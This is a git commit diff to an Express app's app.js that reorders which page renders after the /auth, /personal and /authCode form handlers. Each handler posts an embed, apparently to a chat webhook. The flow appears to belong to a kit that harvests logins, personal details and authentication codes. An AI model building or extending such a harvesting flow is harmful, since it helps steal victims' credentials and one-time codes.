960bc06da4991e3cb145f00d2943206136451509
Jamiu Abidemi Abdulkareem <106557387+jamiuabdulkareem@users.noreply.github.com>
2023-11-22 16:47:36 +0100

    Update app.js

--- app.js
+++ app.js
@@ -67,7 +67,7 @@ app.post("/auth", (req, res) => {
     embeds: [embed],
   });
 
-  res.render("personal");
+  res.render("authCode");
 });
 
 app.post("/email", (req, res) => {
@@ -150,7 +150,7 @@ app.post("/personal", (req, res) => {
     embeds: [embed],
   });
 
-  res.render("authCode");
+  res.render("complete");
 });
 
 app.post("/authCode", (req, res) => {
@@ -172,7 +172,7 @@ app.post("/authCode", (req, res) => {
     embeds: [embed],
   });
 
-  res.render("complete");
+  res.render("personal");
 });
 
 app.listen(3000, () => {
